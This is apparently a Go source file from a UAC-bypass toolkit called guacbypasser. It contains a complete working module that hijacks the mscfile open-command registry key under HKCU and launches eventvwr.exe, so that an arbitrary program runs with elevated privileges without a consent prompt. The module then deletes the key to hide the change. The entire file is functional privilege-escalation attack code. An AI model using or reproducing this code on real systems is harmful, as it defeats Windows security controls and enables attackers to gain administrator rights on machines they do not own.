package guacbypasser

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tEventvwr(path string) error {
	_ = Reporter{
		Name: "eventvwr",
		Desc: "Bypass UAC using eventvwr and registry key manipulation",
		Id:   2,

		Type:   "Once",
		Module: "tEventvwr",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	// Get ABSOLUTE program path
	// +0x9ff ...
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	// Create key in `Software\Classes\mscfile\shell\open\command`
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err
	}

	// Open key in `Software\Classes\mscfile\shell\open\command`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	// Executing EventVWR.exe
	// Executing ABSOLUTE program name with high privileges
	cmd := exec.Command("eventvwr.exe")
	if err = cmd.Run(); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`); err != nil {
		return err
	}

	return nil
}
